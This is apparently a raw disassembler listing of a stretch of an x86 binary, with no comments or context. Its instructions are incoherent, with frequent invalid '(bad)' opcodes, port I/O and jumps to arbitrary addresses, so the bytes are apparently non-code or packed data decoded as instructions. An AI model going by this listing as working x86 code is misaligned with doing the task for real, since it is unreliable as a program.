  42ac5d:	neg    esp
  42ac5f:	push   es
  42ac60:	bound  edi,QWORD PTR [ebp-0x16064c68]
  42ac66:	jg     0x42abea
  42ac68:	js     0x42ac24
  42ac6a:	enter  0x34af,0x62
  42ac6e:	data16 add bh,dh
  42ac71:	into   
  42ac72:	mov    DWORD PTR [esi-0x62],ecx
  42ac75:	mov    WORD PTR [esi],es
  42ac77:	push   ebp
  42ac78:	jle    0x42acb1
  42ac7a:	adc    BYTE PTR [ecx+0x15ace0f0],dh
  42ac80:	dec    edi
  42ac81:	xchg   edi,eax
  42ac82:	add    dl,0x36
  42ac85:	ret    
  42ac86:	inc    ebx
  42ac87:	xchg   ecx,eax
  42ac88:	jo     0x42ac24
  42ac8a:	imul   ebp,ebp,0x73
  42ac8d:	add    DWORD PTR [esi+eiz*1-0x1767f275],edi
  42ac94:	retf   
  42ac95:	mov    cl,0xda
  42ac97:	inc    ebx
  42ac98:	rol    DWORD PTR [esp+eax*8-0x40],cl
  42ac9c:	mov    ch,0x1c
  42ac9e:	pop    edx
  42ac9f:	mov    edx,DWORD PTR [edi-0x240b28cb]
  42aca5:	retf   0x3f84
  42aca8:	fild   QWORD PTR [ecx+0xa]
  42acab:	call   0x277ae20c
  42acb0:	adc    DWORD PTR ss:[ebx-0x1c],edi
  42acb4:	les    esp,FWORD PTR [esi+0x3dc166a4]
  42acba:	ficom  WORD PTR ds:0x8223dcc
  42acc0:	shl    BYTE PTR [eax],0x26
  42acc3:	sbb    ah,cl
  42acc5:	xor    eax,0xf94749d0
  42acca:	test   ah,bl
  42accc:	xchg   edx,eax
  42accd:	lds    ecx,FWORD PTR [ebx-0x68fb56c5]
  42acd3:	inc    esi
  42acd4:	aaa    
  42acd5:	pop    esp
  42acd6:	mov    fs,WORD PTR [ecx]
  42acd8:	int    0xb7
  42acda:	pop    ebp
  42acdb:	push   ebx
  42acdc:	push   0x94e94605
  42ace1:	(bad)  
  42ace2:	into   
  42ace3:	mov    bl,0x6d
  42ace5:	cld    
  42ace6:	retf   0x3b4d
  42ace9:	or     DWORD PTR [edi],ebx
  42aceb:	jg     0x42acf4
	...
  42ad55:	add    cl,ch
  42ad57:	xor    bl,BYTE PTR [edx+edi*1]
  42ad5a:	fistp  QWORD PTR [esi]
  42ad5c:	out    dx,eax
  42ad5d:	repz ret 
  42ad5f:	fcom   DWORD PTR [edx+0x72]
  42ad62:	or     eax,0x73fe7194
  42ad67:	retf   0x1
  42ad6a:	inc    DWORD PTR [eax]
  42ad6c:	add    BYTE PTR [eax],al
  42ad6e:	ja     0x42adc6
  42ad70:	popf   
  42ad71:	cmp    BYTE PTR [ebx],al
  42ad73:	je     0x42ad45
  42ad75:	dec    edx
  42ad76:	xchg   ecx,eax
  42ad77:	xchg   ebp,eax
  42ad78:	inc    ebp
  42ad79:	mov    ecx,0x15688563
  42ad7e:	pop    ss
  42ad7f:	nop
  42ad80:	mov    dl,dh
  42ad82:	(bad)  
  42ad83:	fcmove st,st(3)
  42ad85:	mov    edx,0x957bc67f
  42ad8a:	loopne 0x42adc0
  42ad8c:	mov    ebp,0x9d6d282d
  42ad91:	int    0xd8
  42ad93:	jo     0x42ae07
  42ad95:	pop    ebp
  42ad96:	stos   BYTE PTR es:[edi],al
  42ad97:	pop    edx
  42ad98:	mov    edi,0xc84fcae7
  42ad9d:	mov    eax,cs:0xd9215a95
  42ada3:	ins    BYTE PTR es:[edi],dx
  42ada4:	and    DWORD PTR ds:0xc90edb3a,ecx
  42adaa:	jecxz  0x42ad9a
  42adac:	adc    eax,0x60c0bbe7
  42adb1:	mov    cl,0x55
  42adb3:	repnz lea edx,[ecx-0x2c]
  42adb7:	mov    ds:0x276d7e80,eax
  42adbc:	mov    ecx,0xdc425327
  42adc1:	xchg   ebp,eax
  42adc2:	in     eax,dx
  42adc3:	stos   DWORD PTR es:[edi],eax
  42adc4:	jge    0x42ade2
  42adc6:	dec    edx
  42adc7:	push   ds
  42adc8:	sti    
  42adc9:	out    0xf3,eax
  42adcb:	xchg   BYTE PTR [esi+ecx*4+0x55900d32],al
  42add2:	enter  0x4726,0xea
  42add6:	fwait
  42add7:	ins    DWORD PTR es:[edi],dx
  42add8:	je     0x42adf0
  42adda:	ret    0x7b5f
  42addd:	ds js  0x42ae4b
  42ade0:	aam    0xea
  42ade2:	inc    edi
  42ade3:	outs   dx,BYTE PTR ds:[esi]
  42ade4:	push   0xa5d747bd
  42ade9:	mov    al,0xc7
  42adeb:	in     al,0xe5
  42aded:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42adee:	and    al,0xba
  42adf0:	pushf  
  42adf1:	enter  0x4f8e,0x25
  42adf5:	ja     0x42adc3
  42adf7:	int    0xa4
  42adf9:	push   ss
  42adfa:	pop    es
  42adfb:	jmp    0x7951f7fd
  42ae00:	test   DWORD PTR [ebp+0x1c],eax
  42ae03:	cdq    
  42ae04:	adc    eax,0xe3b04c57
  42ae09:	and    al,0x6b
  42ae0b:	js     0x42ae33
  42ae0d:	jae    0x42add1
  42ae0f:	jmp    0x42ae88
  42ae11:	xor    bh,BYTE PTR [edi+0x0]
  42ae14:	cld    
  42ae15:	gs dec edi
  42ae17:	add    DWORD PTR [ebx+0x16a85238],edx
  42ae1d:	add    eax,0xb0a91ba7
  42ae22:	or     eax,0xdfaf5188
  42ae27:	fsub   QWORD PTR [ebx+ecx*2]
  42ae2a:	pop    es
  42ae2b:	xchg   ebx,eax
  42ae2c:	mov    bl,0x6a
  42ae2e:	mov    ecx,0x3100903b
  42ae33:	out    0xf6,al
  42ae35:	lea    ebp,[ebx+0x7738252]
  42ae3b:	xor    al,dh
  42ae3d:	cdq    
  42ae3e:	adc    eax,0x99cc936f
  42ae43:	(bad)  
  42ae44:	ds test eax,0xf7e734a4
  42ae4a:	(bad)  
  42ae4b:	mov    ds:0xe135ef4e,al
  42ae50:	cmp    edx,eax
  42ae52:	push   eax
  42ae53:	les    esp,FWORD PTR [edi+0x19]
  42ae56:	xchg   edx,eax
  42ae57:	ror    DWORD PTR [ebp-0x18],cl
  42ae5a:	(bad)  
  42ae5b:	pusha  
  42ae5c:	es in  eax,0x24
  42ae5f:	call   0x16c71cf4
  42ae64:	dec    eax
  42ae65:	jmp    0x699db019
  42ae6a:	xchg   esi,eax
  42ae6b:	fcom   QWORD PTR [ebx+0x0]
	...
  42aed6:	mov    edi,0x4a8e4af7
  42aedb:	mov    edi,0x7bd8f7ff
  42aee0:	mov    dh,0xb9
  42aee2:	cmp    bh,bl
  42aee4:	mov    bl,0x4f
  42aee6:	jb     0x42aeb3
  42aee8:	add    DWORD PTR [eax],eax
  42aeea:	inc    DWORD PTR [eax]
  42aeec:	add    BYTE PTR [eax],al
  42aeee:	cmp    esp,edx
  42aef0:	pop    esp
  42aef1:	test   eax,0xfd4163a4
  42aef6:	jne    0x42aeff
  42aef8:	dec    eax
  42aef9:	sbb    esp,DWORD PTR cs:[eax+0x24]
  42aefd:	mov    ecx,0x580cf970
  42af02:	push   eax
  42af03:	jg     0x42aef3
  42af05:	lahf   
  42af06:	jb     0x42aeb9
  42af08:	push   ebp
  42af09:	fwait
  42af0a:	adc    al,0x7f
  42af0c:	imul   esi,DWORD PTR [edi+0x3869b1b],0x7
  42af13:	je     0x42af8b
  42af15:	mov    dh,0xf9
  42af17:	adc    edx,DWORD PTR [edx]
  42af19:	inc    esi
  42af1a:	adc    al,0x95
  42af1c:	push   es
  42af1d:	xchg   ebx,eax
  42af1e:	mov    bl,0xd8
  42af20:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42af21:	xlat   BYTE PTR ds:[ebx]
  42af22:	ror    BYTE PTR [ebp-0x4d1ff4db],cl
  42af28:	fnstenv [eax-0x9]
  42af2b:	sbb    eax,0xd2256430
  42af30:	iret   
  42af31:	pushf  
  42af32:	add    ch,BYTE PTR [esi+0x7afdc9f9]
  42af38:	shl    ebx,1
  42af3a:	sbb    esi,DWORD PTR [edx+edx*2]
  42af3d:	in     eax,0xac
  42af3f:	sub    cl,BYTE PTR [edi+0x4d]
  42af42:	dec    edx
  42af43:	adc    DWORD PTR [ebp+ebp*4-0x5f3ff413],ebp
  42af4a:	mov    al,0xb4
  42af4c:	rcl    DWORD PTR [ecx+esi*8],cl
  42af4f:	jbe    0x42af73
  42af51:	or     eax,0xac70de47
  42af56:	mov    BYTE PTR [esi+eiz*1-0x6d],ch
  42af5a:	aam    0x69
  42af5c:	or     al,0x3
  42af5e:	push   es
  42af5f:	inc    ecx
  42af60:	cmp    ch,dh
  42af62:	inc    edi
  42af63:	test   BYTE PTR [eax+0x5a],bl
  42af66:	adc    ah,cl
  42af68:	in     al,0x39
  42af6a:	dec    esp
  42af6b:	imul   eax,DWORD PTR [ebp+0x107a6713],0xf8488a2f
  42af75:	mov    eax,0xa4082c89
  42af7a:	pop    esp
  42af7b:	dec    edx
  42af7c:	xor    dh,dh
  42af7e:	scas   eax,DWORD PTR es:[edi]
  42af7f:	ss xchg esp,eax
  42af81:	lds    eax,FWORD PTR [ebx-0x2b56106c]
  42af87:	or     ebp,DWORD PTR [ecx+0x5c]
  42af8a:	ret    
  42af8b:	or     bh,dh
  42af8d:	and    eax,0xab5527ba
  42af92:	das    
  42af93:	pop    ss
  42af94:	sub    edx,esp
  42af96:	adc    cl,BYTE PTR [edi-0x3f]
  42af99:	and    al,0x34
  42af9b:	lds    edi,FWORD PTR [ebp+0x1d5d3d2f]
  42afa1:	outs   dx,BYTE PTR ds:[esi]
  42afa2:	mov    ecx,0xffbb4fb
  42afa7:	les    ebp,FWORD PTR [eax-0x42]
  42afaa:	shl    DWORD PTR [ecx],0xa
  42afad:	jns    0x42afc1
  42afaf:	retf   
  42afb0:	push   edx
  42afb1:	jns    0x42af80
  42afb3:	fcomp  QWORD PTR [ebx+0x7e]
  42afb6:	pop    edi
  42afb7:	push   0xffffffcb
  42afb9:	lods   al,BYTE PTR ds:[esi]
  42afba:	rcl    BYTE PTR [ebp-0x71],0x4a
  42afbe:	jns    0x42af54
  42afc0:	mov    ds:0x8b35a093,eax
  42afc5:	ret    0x7e3c
  42afc8:	mov    ah,0x70
  42afca:	cwde   
  42afcb:	jp     0x42af95
  42afcd:	and    esi,DWORD PTR [edi-0x36]
  42afd0:	(bad)  
  42afd1:	cwde   
  42afd2:	mov    ch,0x32
  42afd4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42afd5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42afd6:	cs in  al,0xad
  42afd9:	bound  edi,QWORD PTR [esi+0x4c48fa65]
  42afdf:	aam    0xcd
  42afe1:	stos   BYTE PTR es:[edi],al
  42afe2:	pop    es
  42afe3:	push   cs
  42afe4:	int3   
  42afe5:	add    BYTE PTR ds:0x72c30c31,dl
  42afeb:	test   BYTE PTR [edi],bl
	...
  42b055:	add    cl,bh
  42b057:	enter  0xdc7a,0x7b
  42b05b:	(bad)  
  42b05c:	(bad)  
  42b05d:	in     eax,dx
  42b05e:	sbb    al,0x4f
  42b060:	push   ebp
  42b061:	inc    esp
  42b062:	add    eax,0x71944552
  42b067:	int3   
  42b068:	add    DWORD PTR [eax],eax
  42b06a:	inc    DWORD PTR [eax]
  42b06c:	add    BYTE PTR [eax],al
  42b06e:	in     al,dx
  42b06f:	mov    esi,0x5d488189
  42b074:	cmp    BYTE PTR [edx],ah
  42b076:	loopne 0x42b00a
  42b078:	mov    edi,?
  42b07a:	xchg   BYTE PTR ds:0x29879ad7,al
  42b080:	or     DWORD PTR [edi-0x476b73d2],0x44fb3214
  42b08a:	mov    ah,0xa2
  42b08c:	mov    al,0x79
  42b08e:	sbb    eax,0x8059398
  42b093:	cmp    BYTE PTR [ebx-0x1a],0xd2
  42b097:	mov    bl,0xf9
  42b099:	js     0x42b0bf
  42b09b:	xchg   esp,eax
  42b09c:	test   al,0xee
  42b09e:	call   0xa122:0x9c99156d
  42b0a5:	xchg   esp,eax
  42b0a6:	pop    ds
  42b0a7:	push   cs
  42b0a8:	add    bl,ch
  42b0aa:	mov    cl,0x72
  42b0ac:	mov    ah,0x9c
  42b0ae:	jecxz  0x42b0e2
  42b0b0:	dec    edx
  42b0b1:	adc    DWORD PTR [ebx+ebp*1],ebx
  42b0b4:	push   esp
  42b0b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b0b6:	push   edx
  42b0b7:	xor    DWORD PTR [eax-0x69],eax
  42b0ba:	or     ch,BYTE PTR [ecx+0x5b]
  42b0bd:	bound  esi,QWORD PTR [edi+0x5b]
  42b0c0:	inc    esp
  42b0c1:	fucom  st(1)
  42b0c3:	arpl   WORD PTR [ebx],bp
  42b0c5:	cmp    ebx,esp
  42b0c7:	sbb    DWORD PTR [ecx+0x43],edi
  42b0ca:	mov    DWORD PTR [edi-0x16],ebx
  42b0cd:	mov    ebx,0xecf7cf84
  42b0d2:	inc    edi
  42b0d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b0d4:	push   ecx
  42b0d5:	and    ecx,DWORD PTR [esi-0x6]
  42b0d8:	xchg   edx,eax
  42b0d9:	scas   eax,DWORD PTR es:[edi]
  42b0da:	aas    
  42b0db:	cmp    DWORD PTR [edx+0x6fd587b0],ecx
  42b0e1:	adc    DWORD PTR [ebp+0x60],0xffffff90
  42b0e5:	dec    ebp
  42b0e6:	or     BYTE PTR [ecx-0x4],ah
  42b0e9:	fs dec esp
  42b0eb:	hlt    
  42b0ec:	and    eax,0x27966d03
  42b0f1:	pop    edx
  42b0f2:	push   edx
  42b0f3:	push   es
  42b0f4:	add    al,BYTE PTR [ecx]
  42b0f6:	outs   dx,BYTE PTR ds:[esi]
  42b0f7:	mul    DWORD PTR [eax+0x31]
  42b0fa:	aam    0x9a
  42b0fc:	mov    dl,0x63
  42b0fe:	stos   DWORD PTR es:[edi],eax
  42b0ff:	inc    ebp
  42b100:	dec    ecx
  42b101:	or     eax,0x92e9a141
  42b106:	jb     0x42b14c
  42b108:	enter  0x9700,0x95
  42b10c:	xchg   edi,eax
  42b10d:	sub    al,0x67
  42b10f:	push   0xbe5174a1
  42b114:	retf   
  42b115:	jae    0x42b11e
  42b117:	repnz fs out 0x20,eax
  42b11b:	xor    DWORD PTR [ebx-0x700c22c9],ecx
  42b121:	jecxz  0x42b174
  42b123:	lock xchg DWORD PTR [ecx+0x6417f0d],esi
  42b12a:	push   eax
  42b12b:	out    dx,eax
  42b12c:	xor    ebx,eax
  42b12e:	sub    eax,0xdb2e35f5
  42b133:	mov    esp,0xfc619167
  42b138:	xchg   esi,eax
  42b139:	hlt    
  42b13a:	push   ds
  42b13b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b13c:	dec    eax
  42b13d:	rcl    ch,cl
  42b13f:	mov    eax,0x66583184
  42b144:	mov    ch,0x5c
  42b146:	sbb    eax,0xc599f8d6
  42b14b:	jp     0x42b0ce
  42b14d:	stos   DWORD PTR es:[edi],eax
  42b14e:	sbb    eax,0x10577891
  42b153:	mov    eax,ss:0xdc3e725e
  42b159:	dec    edx
  42b15a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b15b:	jae    0x42b0fc
  42b15d:	or     al,0x42
  42b15f:	mov    ch,0x3d
  42b161:	push   ss
  42b162:	stc    
  42b163:	mov    dl,0xc6
  42b165:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b166:	inc    eax
  42b167:	test   al,0xa0
  42b169:	jo     0x42b15c
  42b16b:	mov    ds:0x3,al
	...
  42b1d4:	add    BYTE PTR [eax],al
  42b1d6:	jne    0x42b1fd
  42b1d8:	imul   ebx,DWORD PTR [edi-0x51]
  42b1dc:	cmc    
  42b1dd:	call   eax
  42b1df:	inc    ebx
  42b1e0:	push   edi
  42b1e1:	popa   
  42b1e2:	adc    dl,ah
  42b1e4:	adc    eax,0x1cd70b8
  42b1e9:	add    bh,bh
  42b1eb:	add    BYTE PTR [eax],al
  42b1ed:	add    BYTE PTR [eax+edi*4-0x7],bh
  42b1f1:	mov    al,ah
  42b1f3:	cmp    DWORD PTR [edx+0x37],ecx
  42b1f6:	cmp    eax,0x7ea2275f
  42b1fb:	xchg   edi,eax
  42b1fc:	frstor [edi+0x30]
  42b1ff:	sub    eax,0x869f8514
  42b204:	in     eax,0xa2
  42b206:	outs   dx,DWORD PTR ds:[esi]
  42b207:	lahf   
  42b208:	leave  
  42b209:	pop    ebx
  42b20a:	in     al,0x6
  42b20c:	sbb    eax,0xcbf24343
  42b211:	lock shl DWORD PTR [eax+0x347358d2],1
  42b218:	fidivr DWORD PTR [edx+0x66e8812a]
  42b21e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b21f:	in     eax,0x6b
  42b221:	mov    ah,0x49
  42b223:	cmp    ebx,edx
  42b225:	xchg   ebx,eax
  42b226:	or     ebx,edi
  42b228:	xor    BYTE PTR [ebp-0x7f8e0277],dh
  42b22e:	in     eax,dx
  42b22f:	hlt    
  42b230:	mov    al,ds:0x930ee13d
  42b235:	lods   eax,DWORD PTR ds:[esi]
  42b236:	pop    ecx
  42b237:	push   cs
  42b238:	fnstsw ax
  42b23a:	add    al,0x2
  42b23c:	add    BYTE PTR [ebp+0x3b56f62],dh
  42b242:	jg     0x42b233
  42b244:	xor    BYTE PTR [ebp+ebx*2+0x48],dl
  42b248:	push   ss
  42b249:	jmp    0x42b26b
  42b24b:	shl    BYTE PTR [eax+0x16eee806],1
  42b251:	mov    BYTE PTR [ecx+0x7d],cl
  42b254:	inc    ebp
  42b255:	and    al,0xd
  42b257:	clc    
  42b258:	mov    dh,0x6f
  42b25a:	stc    
  42b25b:	(bad)  
  42b25c:	clc    
  42b25d:	imul   BYTE PTR [edi-0x4c07d17f]
  42b263:	fwait
  42b264:	dec    ebx
  42b265:	lahf   
  42b266:	push   es
  42b267:	pop    ebx
  42b268:	pushf  
  42b269:	jmp    0x7559:0x274d5480
  42b270:	mov    esi,0xb631dafe
  42b275:	or     cl,0xc1
  42b278:	or     BYTE PTR [ebp-0x270fcc80],0xd9
  42b27f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b280:	cmp    DWORD PTR [esi],esp
  42b282:	ins    DWORD PTR es:[edi],dx
  42b283:	jg     0x42b260
  42b285:	std    
  42b286:	gs test al,0x64
  42b289:	leave  
  42b28a:	test   eax,0xeef275c9
  42b28f:	rol    bh,0x7a
  42b292:	adc    BYTE PTR [ebp-0x3b],0x32
  42b296:	fld    QWORD PTR [ebx]
  42b298:	out    0x31,al
  42b29a:	sub    DWORD PTR [ebp-0x3726b2ba],0x29
  42b2a1:	inc    eax
  42b2a2:	shr    BYTE PTR [esi+0x64448b28],cl
  42b2a8:	cmp    eax,0xe0067f0b
  42b2ad:	not    BYTE PTR [ebp-0x69]
  42b2b0:	add    cl,BYTE PTR [ebp+0x57]
  42b2b3:	or     eax,0xd5f17fa3
  42b2b8:	ins    DWORD PTR es:[edi],dx
  42b2b9:	shl    ecx,1
  42b2bb:	aaa    
  42b2bc:	ret    0xe718
  42b2bf:	mov    esp,0x7ddebde1
  42b2c4:	out    dx,eax
  42b2c5:	shl    DWORD PTR [esi+0x48],1
  42b2c8:	(bad)  
  42b2c9:	cwde   
  42b2ca:	jmp    0x42b262
  42b2cc:	lods   eax,DWORD PTR ds:[esi]
  42b2cd:	mov    al,ds:0x229720d
  42b2d2:	xor    eax,0xa1c93db2
  42b2d7:	in     eax,dx
  42b2d8:	fiadd  DWORD PTR [edx]
  42b2da:	cmc    
  42b2db:	add    al,0xc4
  42b2dd:	inc    ebx
  42b2de:	sbb    ebx,DWORD PTR [esi]
  42b2e0:	loop   0x42b305
  42b2e2:	mov    bl,0x92
  42b2e4:	arpl   di,bx
  42b2e6:	xor    eax,0x8a82f7eb
  42b2eb:	pop    esi
  42b2ec:	and    al,BYTE PTR [eax]
	...
  42b356:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b357:	mov    ds,WORD PTR [ecx-0x28844a0]
  42b35d:	iret   
  42b35e:	sub    eax,0x1b738e65
  42b363:	adc    edi,edi
  42b365:	and    BYTE PTR [edi-0x32],ch
  42b368:	add    DWORD PTR [eax],eax
  42b36a:	inc    DWORD PTR [eax]
  42b36c:	add    BYTE PTR [eax],al
  42b36e:	mov    bl,dl
  42b370:	cwde   
  42b371:	popf   
  42b372:	xchg   cl,bh
  42b374:	scas   al,BYTE PTR es:[edi]
  42b375:	sub    al,0x50
  42b377:	xchg   edx,eax
  42b378:	lods   eax,DWORD PTR ds:[esi]
  42b379:	or     dl,BYTE PTR [ebx]
  42b37b:	cli    
  42b37c:	das    
  42b37d:	fsubr  DWORD PTR [ecx+0x7691c081]
  42b383:	push   ds
  42b384:	lods   eax,DWORD PTR ds:[esi]
  42b385:	sbb    edx,DWORD PTR [esp+esi*8]
  42b388:	cwde   
  42b389:	cmp    BYTE PTR [esi-0x40dd07e7],dh
  42b38f:	mov    ebx,0x4c83d6bc
  42b394:	(bad)  [ecx+0xd248a1b]
  42b39a:	out    dx,al
  42b39b:	jmp    0x42b33f
  42b39d:	lea    eax,[ecx-0x2e]
  42b3a0:	je     0x42b32e
  42b3a2:	jns    0x42b3cb
  42b3a4:	fcmove st,st(4)
  42b3a6:	xor    bl,ah
  42b3a8:	mov    bh,0xed
  42b3aa:	and    al,0xe0
  42b3ac:	adc    eax,0xa8a7bcd3
  42b3b1:	xor    BYTE PTR [ebx-0x41],0x14
  42b3b5:	fisttp DWORD PTR [esi]
  42b3b7:	add    DWORD PTR [edi+0x5b6ba499],esi
  42b3bd:	mov    bh,0x62
  42b3bf:	jbe    0x42b39e
  42b3c1:	cmp    dh,BYTE PTR [esp+eax*1]
  42b3c4:	and    eax,0x21b8bbb8
  42b3c9:	dec    eax
  42b3ca:	xor    bl,BYTE PTR [ecx+edx*1+0x64772904]
  42b3d1:	mov    ecx,DWORD PTR [edx+0x549c0891]
  42b3d7:	test   eax,0x108b38d1
  42b3dc:	mov    ch,0x60
  42b3de:	es dec edi
  42b3e0:	mov    ebp,0x21b8a95d
  42b3e5:	daa    
  42b3e6:	rol    bl,cl
  42b3e8:	adc    esp,edx
  42b3ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b3eb:	bound  eax,QWORD PTR [esi+0x1a]
  42b3ee:	push   ebp
  42b3ef:	push   ecx
  42b3f0:	jne    0x42b41f
  42b3f2:	mov    bh,0xda
  42b3f4:	cmp    eax,0xa8532e3e
  42b3f9:	and    ebp,ebx
  42b3fb:	xchg   ecx,eax
  42b3fc:	push   0xffffff8b
  42b3fe:	or     DWORD PTR [ebx+0x25d0fcfc],ebx
  42b404:	mov    edx,0x8b31fe65
  42b409:	(bad)  
  42b40a:	stos   DWORD PTR es:[edi],eax
  42b40b:	js     0x42b404
  42b40d:	adc    ebx,DWORD PTR [ebp+0x6fdbdfb9]
  42b413:	mov    ebx,0x7176c3c1
  42b418:	mov    esp,0xeaa1576f
  42b41d:	and    BYTE PTR [esi],dh
  42b41f:	loop   0x42b47e
  42b421:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b422:	mov    bl,0x2c
  42b424:	repnz sub eax,0x97f5a08b
  42b42a:	(bad)  
  42b42b:	push   edi
  42b42c:	push   eax
  42b42d:	loopne 0x42b4a1
  42b42f:	dec    esp
  42b430:	pop    eax
  42b431:	pop    ds
  42b432:	mov    ds:0x95a6099a,al
  42b437:	jmp    0xedf4:0x5b7fcfc3
  42b43e:	neg    BYTE PTR [edx+0x3b44e6bf]
  42b444:	int3   
  42b445:	or     cl,cl
  42b447:	sbb    eax,0x4027aac9
  42b44c:	fistp  QWORD PTR [ebx]
  42b44e:	xor    DWORD PTR [ebp+0x52f773fd],eax
  42b454:	js     0x42b4bb
  42b456:	push   ebx
  42b457:	mov    edi,0x656a88c3
  42b45c:	arpl   WORD PTR [ebx],bp
  42b45e:	lock push cs
  42b460:	adc    eax,0x5924eada
  42b465:	mov    dh,0x2d
  42b467:	cmp    ch,ch
  42b469:	cmp    eax,0x4b6c8c
	...
  42b4d6:	mov    al,BYTE PTR [ebp+0x20]
  42b4d9:	out    dx,al
  42b4da:	out    dx,eax
  42b4db:	out    dx,eax
  42b4dc:	into   
  42b4dd:	gs jo  0x42b4b0
  42b4e0:	cld    
  42b4e1:	test   ebx,ecx
  42b4e3:	fistp  WORD PTR [eax]
  42b4e5:	push   ds
  42b4e6:	outs   dx,BYTE PTR ds:[esi]
  42b4e7:	iret   
  42b4e8:	add    DWORD PTR [eax],eax
  42b4ea:	inc    DWORD PTR [eax]
  42b4ec:	add    BYTE PTR [eax],al
  42b4ee:	ss mov esi,0x7fc5f7ba
  42b4f4:	xor    cl,BYTE PTR [edx+0x7b]
  42b4f7:	mov    ecx,esi
  42b4f9:	push   ds
  42b4fa:	mov    dl,0x85
  42b4fc:	mov    ds:0x5a055fa1,al
  42b501:	imul   ecx,DWORD PTR [edx],0x51
  42b504:	cdq    
  42b505:	mov    dh,0x67
  42b507:	leave  
  42b508:	icebp  
  42b509:	cmp    al,0xd7
  42b50b:	sub    al,0x1b
  42b50d:	mov    ds:0x76296a59,al
  42b512:	rcr    dl,1
  42b514:	jnp    0x42b4a1
  42b516:	shl    BYTE PTR [edi-0x41ddf6dd],0x40
  42b51d:	add    al,0xfd
  42b51f:	sbb    al,0x8d
  42b521:	arpl   WORD PTR [edi+eax*1-0x37a023fb],sp
  42b528:	xor    al,0xdc
  42b52a:	pop    ebp
  42b52b:	ds aad 0x50
  42b52e:	sub    BYTE PTR [edx],bl
  42b530:	into   
  42b531:	jg     0x42b4e1
  42b533:	dec    esi
  42b534:	cmp    eax,0x37d4c023
  42b539:	sub    ebx,DWORD PTR [edi]
  42b53b:	data16 mov es,WORD PTR [ecx+0x55af64b9]
  42b542:	xor    BYTE PTR [edx+edx*1-0x5c0989a4],0x22
  42b54a:	xor    DWORD PTR [edx+0x4d72ae98],ecx
  42b550:	mov    ch,0x28
  42b552:	push   edx
  42b553:	or     DWORD PTR [edx],esp
  42b555:	dec    eax
  42b556:	in     eax,dx
  42b557:	das    
  42b558:	dec    ecx
  42b559:	fcomp  DWORD PTR [edi+0x79]
  42b55c:	jge    0x42b4e6
  42b55e:	rol    BYTE PTR [ecx+0x6c3a977e],0xa0
  42b565:	and    ecx,DWORD PTR [esi-0x7324ca76]
  42b56b:	mov    al,0xab
  42b56d:	aad    0x58
  42b56f:	mov    edi,0x559f293
  42b574:	and    ecx,edx
  42b576:	loopne 0x42b5ba
  42b578:	pop    eax
  42b579:	and    BYTE PTR [edi-0x3b],ah
  42b57c:	adc    BYTE PTR [eax],bl
  42b57e:	mov    DWORD PTR [esi+edi*4-0x3f],ecx
  42b582:	mov    ebx,0xd67b77bb
  42b587:	push   esi
  42b588:	int3   
  42b589:	and    cl,BYTE PTR [eax]
  42b58b:	jae    0x42b5c1
  42b58d:	mov    dh,0x3
  42b58f:	cdq    
  42b590:	jg     0x42b5a1
  42b592:	add    eax,0xcecef63
  42b597:	pop    ss
  42b598:	add    eax,0xcb647acd
  42b59d:	ins    DWORD PTR es:[edi],dx
  42b59e:	mov    edi,0x6edd0dbc
  42b5a3:	jl     0x42b607
  42b5a5:	std    
  42b5a6:	and    dh,BYTE PTR [ebx+eiz*4]
  42b5a9:	aas    
  42b5aa:	std    
  42b5ab:	sub    BYTE PTR [ebx+0x5f06774e],dl
  42b5b1:	jl     0x42b568
  42b5b3:	sti    
  42b5b4:	jo     0x42b5f7
  42b5b6:	or     BYTE PTR [edx+0x6d],bh
  42b5b9:	imul   esp,DWORD PTR [ebx],0x5c
  42b5bc:	or     eax,0xaa169f91
  42b5c1:	cli    
  42b5c2:	or     ch,0x67
  42b5c5:	(bad)  
  42b5c8:	addr16 dec esp
  42b5ca:	mov    bh,0xd3
  42b5cc:	sbb    al,0xbc
  42b5ce:	sar    bh,cl
  42b5d0:	mov    BYTE PTR [edx],dh
  42b5d2:	popf   
  42b5d3:	pop    ss
  42b5d4:	sub    BYTE PTR [ebx-0xd],cl
  42b5d7:	bound  edi,QWORD PTR [esi-0x39]
  42b5da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b5db:	push   ebp
  42b5dc:	out    dx,al
  42b5dd:	hlt    
  42b5de:	pop    eax
  42b5df:	pop    ecx
  42b5e0:	je     0x42b563
  42b5e2:	mov    ecx,0x234d2982
  42b5e7:	jmp    0x42b63d
  42b5e9:	dec    esi
  42b5ea:	cmp    al,0x61
  42b5ec:	pop    ds
	...
  42b655:	add    al,ah
  42b657:	xchg   esp,eax
  42b658:	and    bh,cl
  42b65a:	je     0x42b65b
  42b65c:	out    dx,eax
  42b65d:	mov    edi,0x1397875f
  42b662:	sbb    dh,BYTE PTR [eax*2+0x1d06d53]
  42b669:	add    bh,bh
  42b66b:	add    BYTE PTR [eax],al
  42b66d:	add    BYTE PTR [eax-0x29],ch
  42b670:	inc    ebp
  42b671:	pusha  
  42b672:	mov    esi,0xe8b452f9
  42b677:	jnp    0x42b675
  42b679:	cmp    BYTE PTR [edi+0x60],0x6c
  42b67d:	jecxz  0x42b632
  42b67f:	rcl    BYTE PTR [edi],1
  42b681:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b682:	mov    bh,ch
  42b684:	mov    dh,0xfd
  42b686:	and    DWORD PTR [ebx-0x7e],edx
  42b689:	cmp    al,0xcc
  42b68b:	xchg   ecx,eax
  42b68c:	sub    al,BYTE PTR [ebx+0x5031b65b]
  42b692:	pop    ss
  42b693:	(bad)  
  42b694:	popf   
  42b695:	into   
  42b696:	pop    ecx
  42b697:	jno    0x42b6ad
  42b699:	stos   BYTE PTR es:[edi],al
